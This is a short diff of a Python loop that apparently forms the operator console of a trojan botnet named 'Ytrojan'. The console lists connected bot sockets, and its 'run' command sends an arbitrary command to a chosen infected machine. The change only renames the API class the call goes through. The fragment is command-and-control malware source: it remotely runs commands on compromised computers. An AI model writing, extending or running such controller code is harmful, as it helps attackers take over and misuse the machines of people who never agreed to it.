@@ -35,7 +35,7 @@ while True:
             print("%s  |  %s" % (BotSockets.index(BotSocket),YtrojanAPI.BotNet[BotSocket]))
     
     elif Command.split()[0] == "run":
-        print(ControlAPI.Run(BotSockets[int(Command.split()[1])],Command.split(" ",2)[2]))
+        print(YtrojanAPI.Run(BotSockets[int(Command.split()[1])],Command.split(" ",2)[2]))
     
 
 
